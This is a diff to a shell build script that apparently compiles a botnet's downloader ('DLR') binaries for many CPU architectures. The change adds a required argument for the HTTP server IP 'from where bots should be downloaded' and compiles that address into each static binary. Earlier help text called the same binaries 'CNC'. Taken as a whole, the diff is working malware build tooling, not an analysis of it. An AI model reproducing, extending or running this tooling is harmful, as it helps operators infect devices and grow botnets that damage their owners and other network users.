@@ -32,9 +32,16 @@ OUTDIR="$SCRIPT_DIR/bins"
 
 function print_help {
     echo -e "${CYAN}==================== HELP ====================${RESET}"
-    echo -e "${BOLD}Usage:${RESET} $0"
+    echo -e "${BOLD}Usage:${RESET} $0 <server_ip>"
     echo
-    echo "Builds CNC binaries for multiple architectures."
+    echo "Builds DLR binaries for multiple architectures."
+    echo
+    echo -e "${BOLD}Arguments:${RESET}"
+    echo -e "  ${YELLOW}server_ip${RESET}    The HTTP server IP address from where bots should be downloaded"
+    echo
+    echo -e "${BOLD}Examples:${RESET}"
+    echo "  $0 192.168.1.100"
+    echo "  $0 10.0.0.5"
     echo
     echo -e "${BOLD}Note:${RESET} If ${YELLOW}bins${RESET} directory exists, you will be prompted before deleting it."
     echo -e "${CYAN}==============================================${RESET}"
@@ -67,6 +74,49 @@ if [[ "$1" == "-h" || "$1" == "--help" ]]; then
     print_help
     exit 0
 fi
+
+# =======================================
+# Validate arguments
+# =======================================
+if [[ $# -eq 0 ]]; then
+    echo -e "${RED}==================== ERROR ====================${RESET}"
+    echo
+    echo -e "${RED}Error:${RESET} Missing required argument: server IP address"
+    echo
+    print_help
+    exit 1
+fi
+
+SERVER_IP="$1"
+
+# Validate IP address format (basic validation)
+if [[ ! "$SERVER_IP" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+    echo -e "${RED}==================== ERROR ====================${RESET}"
+    echo
+    echo -e "${RED}Error:${RESET} Invalid IP address format: '$SERVER_IP'"
+    echo -e "Expected format: ${YELLOW}xxx.xxx.xxx.xxx${RESET}"
+    echo
+    print_help
+    exit 1
+fi
+
+# Extract IP octets for compilation
+IFS='.' read -r ip1 ip2 ip3 ip4 <<< "$SERVER_IP"
+
+# Validate each octet is within valid range (0-255)
+for octet in "$ip1" "$ip2" "$ip3" "$ip4"; do
+    if [[ "$octet" -gt 255 ]]; then
+        echo -e "${RED}==================== ERROR ====================${RESET}"
+        echo
+        echo -e "${RED}Error:${RESET} Invalid IP address: '$SERVER_IP'"
+        echo -e "Each octet must be between 0 and 255."
+        echo
+        print_help
+        exit 1
+    fi
+done
+
+echo -e "${CYAN}[*] Using HTTP server IP: ${YELLOW}$SERVER_IP${RESET}"
 
 # =======================================
 # Prompt for existing bins
@@ -104,8 +154,9 @@ for arch in "${!ARCHS[@]}"; do
 
     # Compile
     if ! "$compiler" -Os -D BOT_ARCH="\"$arch\"" -D "${arch^^}" \
+        -D HTTP_SERVER_IP1="$ip1" -D HTTP_SERVER_IP2="$ip2" -D HTTP_SERVER_IP3="$ip3" -D HTTP_SERVER_IP4="$ip4" \
         -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start \
-        -nostartfiles -static $SCRIPT_DIR/main.c -o "$outfile"; then
+        -nostartfiles -static $SCRIPT_DIR/src/main.c -o "$outfile"; then
         print_error "Failed to compile $arch binary."
     fi
 
@@ -133,6 +184,7 @@ done
 
 echo -e "${YELLOW}==================== BUILD COMPLETE ====================${RESET}"
 echo -e "${GREEN}[*] All binaries are ready in ${GREEN}$OUTDIR${RESET}"
+echo -e "${GREEN}[*] HTTP server IP configured as: ${YELLOW}$SERVER_IP${RESET}"
 echo -e "${YELLOW}========================================================${RESET}"
 
 exit 0
